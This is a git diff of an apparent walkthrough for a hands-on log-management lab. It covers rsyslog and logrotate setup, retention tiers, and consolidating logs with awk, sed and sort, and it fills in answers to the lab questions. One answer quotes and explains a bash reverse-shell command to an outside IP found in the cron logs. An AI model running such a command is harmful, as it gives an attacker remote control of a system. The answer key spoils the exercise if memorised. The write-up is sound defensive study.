@@ -255,44 +255,61 @@ Live monitoring and integration with incident management are also vital for real
 
 ## Practical Activity: Log Collection with rsyslog
 
-The centralisation and management of logs is important for swift incident response. In this example we will configure **rsyslog** to log all sshd messages to a specific file.
+The centralization and management of logs is important for swift incident response. In this example we will configure **rsyslog** to log all sshd messages to a specific file.
+
+- **nano /etc/rsyslog.d/98-websrv-02-sshd.conf** Create a configuration file
+- Add configurations that direct the sshd messages to the specific log file:
+
+``` 
+$FileCreateMode 0644
+:programname, isequal, "sshd" /var/log/websrv-02/rsyslog_sshd.log
+```
+
+- Save and close
+- **sudo systemctl restart rsyslog**  
 
 
 ---
 
 ## 1. After configuring rsyslog for sshd, what username repeatedly appears in the sshd logs at /var/log/websrv-02/rsyslog_sshd.log, indicating failed login attempts or brute forcing?
 
-
+We can observe on multiple failed attempts by the user stansimon as he tries to connect to multiple different ports.
+```
+Oct 13 18:02:07 ip-10-64-175-101 sshd[6804]: Failed password for invalid user stansimon from 34.253.159.159 port 45698 ssh2
+Oct 13 18:02:07 ip-10-64-175-101 sshd[6807]: Connection closed by invalid user stansimon 34.253.159.159 port 45732 [preauth]
+```
 
 <p align="center">
 <img src=screenshots/intro-to-logs-q5.png width="700">
 </p>
 
-**Answer:**
+**Answer: stansimon**
 
 ---
 
 ## 2. What is the IP address of SIEM-02 based on the rsyslog configuration file /etc/rsyslog.d/99-websrv-02-cron.conf, which is used to monitor cron messages?
 
-
+To check or edit the configuration that is used to monitor cron messages we can use: **nano /etc/rsyslog.d/99-websrv-02-cron.conf** 
 
 <p align="center">
 <img src=screenshots/intro-to-logs-q6.png width="700">
 </p>
 
-**Answer:**
+**Answer: 10.10.10.101**
 
 ---
 
 ## 3. Based on the generated logs in /var/log/websrv-02/rsyslog_cron.log, what command is being executed by the root user?
 
-
+The root user makes multiple attempts to open a reverse shell. 
+	- **/dev/tcp/34.253.159.159/9999** Establish a network connection on IP 34.253.159.159 and Port 9999
+	- **0>&1** Points an input at that same connection so the attacker can type commands and feed it to the shell
 
 <p align="center">
 <img src=screenshots/intro-to-logs-q7.png width="700">
 </p>
 
-**Answer:**
+**Answer: /bin/bash -c "/bin/bash -i >& /dev/tcp/34.253.159.159/9999 0>&1"**
 
 ---
 
@@ -300,47 +317,99 @@ The centralisation and management of logs is important for swift incident respon
 
 ## Log Storage
 
+Logs can be stored in various places: its own machine, a centralized repo, or cloud storage.
 
+Where companies decide to store their logs depend on multiple factors. 
+
+| Factor | What It Means |
+|---|---|
+| Security Requirements | Store logs in line with org or regulatory security rules |
+| Accessibility Needs | Who needs the logs, and how fast |
+| Storage Capacity | How much space the log volume needs |
+| Cost Considerations | Budget decides cloud vs local storage |
+| Compliance Regulations | Industry rules on how logs must be stored |
+| Retention Policies | How long logs are kept and how easy they are to pull back |
+| Disaster Recovery Plans | Logs must survive a system failure |
 
 ## Log Retention
 
+One of the most expensives of aspects in the digital world is storage, and logs from hundreds of machines and eomployees will ad up quickly.
 
+To determine what sort of storage longevity we may need, we can use the concept of hot, warm and cold storage. 
+
+| Tier | Age of Logs | Access Speed | Used For |
+|---|---|---|---|
+| 🔥 Hot | 3 to 6 months | Near real-time | Active investigations and daily monitoring |
+| 🌤️ Warm | 6 months to 2 years | Easy, but slower than Hot | Data lake for broader lookups |
+| 🧊 Cold | 2 to 5 years | Slow, archived or compressed | Looking back at old incidents and scoping |
 
 ## Log Deletion
 
+Log deletion must be precise; you don't want to discard what you may still need. Backups before deleting anything are an unwritten rule that we should never forget. As for written rules, companies need well-defined policies to ensure compliance with data laws and regulations.
 
+Log Deletion helps with:
+	- Costs of storage
+	- Manageable size of logs for swift incident analysis
+	- Compliance with privacy regulations. Example: GDPR requires unnecessary data to be deleted
 
 ## Best Practices: Log Storage, Retention and Deletion
 
-
+| Best Practice | Why It Matters |
+|---|---|
+| Set policy from business and legal needs | Storage, retention, and deletion rules match what the org and the law require |
+| Review and update regularly | Rules and regulations change over time |
+| Automate the process | Keeps things consistent and cuts human error |
+| Encrypt sensitive logs | Protects the data inside them |
+| Back up regularly, especially before deletion | Nothing important gets lost for good |
 
 ## Practical Activity: Log Management with logrotate
 
+A tool used in log file rotation that deals with compression and management is **logrotate**.
+	- Allows for automatic rotation, compression and, removal of log files.
+	- We create a config file **nano /etc/logrotate.d/98-websrv-02_sshd.conf**
+	- Define the Log Settings. 
+	Every day, box up the current log, start a fresh one immediately. Keep the last 30 boxes; toss anything older:
+```
+/var/log/websrv-02/rsyslog_sshd.log {
+    daily
+    rotate 30
+    compress
+    lastaction
+        DATE=$(date +"%Y-%m-%d")
+        echo "$(date)" >> "/var/log/websrv-02/hashes_"$DATE"_rsyslog_sshd.txt"
+        for i in $(seq 1 30); do
+            FILE="/var/log/websrv-02/rsyslog_sshd.log.$i.gz"
+            if [ -f "$FILE" ]; then
+                HASH=$(/usr/bin/sha256sum "$FILE" | awk '{ print $1 }')
+                echo "rsyslog_sshd.log.$i.gz "$HASH"" >> "/var/log/websrv-02/hashes_"$DATE"_rsyslog_sshd.txt"
+            fi
+        done
+        systemctl restart rsyslog
+    endscript
+}
+```
 
 
 ---
 
 ## 1. Based on the logrotate configuration /etc/logrotate.d/99-websrv-02_cron.conf, how many versions of old compressed log file copies will be kept?
 
-
+We can view the config with nano /etc/logrotate.d/99-websrv-02_cron.conf
+	- 3rd line: rotate 24
 
 <p align="center">
 <img src=screenshots/intro-to-logs-q8.png width="700">
 </p>
 
-**Answer:**
+**Answer: 24**
 
 ---
 
 ## 2. Based on the logrotate configuration /etc/logrotate.d/99-websrv-02_cron.conf, what is the log rotation frequency?
 
+On the 2nd line we can observe "hourly"
 
-
-<p align="center">
-<img src=screenshots/intro-to-logs-q9.png width="700">
-</p>
-
-**Answer:**
+**Answer: hourly**
 
 ---
 
@@ -348,27 +417,92 @@ The centralisation and management of logs is important for swift incident respon
 
 ## Log Analysis Process
 
+Logs are not just a collection of events; engineers can use them to diagnose systems, strengthen cybersecurity, and ensure compliance.
 
+You can do log analysis manually through the terminal; it's daunting, but doable. To make the hundreds of thousands of lines of information manageable, we can rely on systems such as Splunk and Elastic Stack. 
+
+| Step | What It Means |
+|---|---|
+| Data Sources | Where logs come from: the systems and apps doing the logging |
+| Parsing | Break raw logs into readable pieces |
+| Normalization | Put everything into one standard format so different sources can be compared |
+| Sorting | Order logs by time, source, event type, or severity to spot patterns |
+| Classification | Tag logs by category so you can filter to what matters |
+| Enrichment | Add context like geolocation, user details, or threat intel |
+| Correlation | Link related entries across logs to see the full story |
+| Visualisation | Turn data into charts and graphs to spot trends fast |
+| Reporting | Summarise findings for management, security teams, or auditors |
 
 ## Log Analysis Tools
 
-
+- **SIEMs** like Splunk and Elastic for big, complex analysis
+- **Linux built-ins** for fast analysis during incident response: `cat`, `grep`, `sed`, `sort`, `uniq`, `awk`
+- **Hashing** to prove integrity: `sha256sum` on Linux, `Get-FileHash` on Windows
+- **Windows**: Eric Zimmerman's EZ-Tools
+- Hash the log file **at collection** so it holds up as evidence in court
 
 ## Log Analysis Techniques
 
-
+| Technique | What It Does |
+|---|---|
+| Pattern Recognition | Spot recurring sequences, normal or suspicious |
+| Anomaly Detection | Flag anything that breaks the expected pattern |
+| Correlation Analysis | Connect events to find cause and effect |
+| Timeline Analysis | Track behaviour over time |
+| Machine Learning and AI | Automate classification, enrichment, and predictions |
+| Visualization | Graphs and charts for quick insight |
+| Statistical Analysis | Use numbers to back decisions and test assumptions |
 
 ## Working with Logs: Practical Application
 
-
+Two ways to work the logs in this task:
+- **Raw:** open the unparsed log files straight in the Log Viewer tool, no prep needed
+- **Parsed:** clean and merge the logs with Unix tools into one consolidated file, then view that
 
 ## Unparsed Raw Log Files
 
+- Log Viewer runs on port `8111` of the lab machine
+- Open in the AttackBox or VM browser (the VM's Firefox can take a few minutes to load)
+- Swap `MACHINE_IP` for the lab machine's current IP
 
+```
+http://MACHINE_IP:8111/log?log=%2Fvar%2Flog%2Fgitlab%2Fnginx%2Faccess.log&log=%2Fvar%2Flog%2Fwebsrv-02%2Frsyslog_cron.log&log=%2Fvar%2Flog%2Fwebsrv-02%2Frsyslog_sshd.log&log=%2Fvar%2Flog%2Fgitlab%2Fgitlab-rails%2Fapi_json.log
+```
 
 ## Parsed and Consolidated Log File
 
+- Goal: four different log formats ➡️ one file, one timestamp format, sorted by time
+- Flow: **normalise** with `awk` and `sed` ➡️ (optional) **filter** with `grep` ➡️ **sort** ➡️ **remove duplicates** with `uniq`
 
+```
+# Process nginx access log
+awk -F'[][]' '{print "[" $2 "]", "--- /var/log/gitlab/nginx/access.log ---", "\"" $0 "\""}' /var/log/gitlab/nginx/access.log  | sed "s/ +0000//g" >/tmp/parsed_consolidated.log
+
+# Process rsyslog_cron.log
+awk '{ original_line = $0; gsub(/ /, "/", $1); printf "[%s/%s/2023:%s] --- /var/log/websrv-02/rsyslog_cron.log --- \"%s\"\n", $2, $1, $3, original_line }' /var/log/websrv-02/rsyslog_cron.log >>/tmp/parsed_consolidated.log
+
+# Process rsyslog_sshd.log
+awk '{ original_line = $0; gsub(/ /, "/", $1); printf "[%s/%s/2023:%s] --- /var/log/websrv-02/rsyslog_sshd.log --- \"%s\"\n", $2, $1, $3, original_line }' /var/log/websrv-02/rsyslog_sshd.log >>/tmp/parsed_consolidated.log
+
+# Process gitlab-rails/api_json.log
+awk -F'"' '{timestamp = $4; converted = strftime("[%d/%b/%Y:%H:%M:%S]", mktime(substr(timestamp, 1, 4) " " substr(timestamp, 6, 2) " " substr(timestamp, 9, 2) " " substr(timestamp, 12, 2) " " substr(timestamp, 15, 2) " " substr(timestamp, 18, 2) " 0 0")); print converted, "--- /var/log/gitlab/gitlab-rails/api_json.log ---", "\""$0"\""}' /var/log/gitlab/gitlab-rails/api_json.log >> /tmp/parsed_consolidated.log
+```
+
+```
+# Optional: filter for the adversary IP
+grep "34.253.159.159" /tmp/parsed_consolidated.log > /tmp/filtered_consolidated.log
+
+# Sort by date and time
+sort /tmp/parsed_consolidated.log > /tmp/sort_parsed_consolidated.log
+
+# Remove duplicates
+uniq /tmp/sort_parsed_consolidated.log > /tmp/uniq_sort_parsed_consolidated.log
+```
+
+View the final file in Log Viewer:
+```
+http://MACHINE_IP:8111/log?path=%2Ftmp%2Funiq_sort_parsed_consolidated.log
+```
 
 ---
 
@@ -410,19 +544,6 @@ The centralisation and management of logs is important for swift incident respon
 
 # TASK 7 - Conclusion
 
-- Logs turned scattered events on WEBSRV-02 into a timeline of what the adversary did
-- Configured rsyslog to split sshd and cron messages into their own files, then used logrotate to rotate, compress, and hash them for integrity
-- Worked raw logs in the Log Viewer, then parsed, normalised, sorted, and deduplicated them into one consolidated file with awk, sed, sort, and uniq
-- Next room in the module: Log Operations
+
 
 ---
-
-## IOC Summary
-
-| Type | Indicator | Context |
-|---|---|---|
-| IP | | |
-| Domain | | |
-| Account | | |
-| Process | | |
-| File | | |
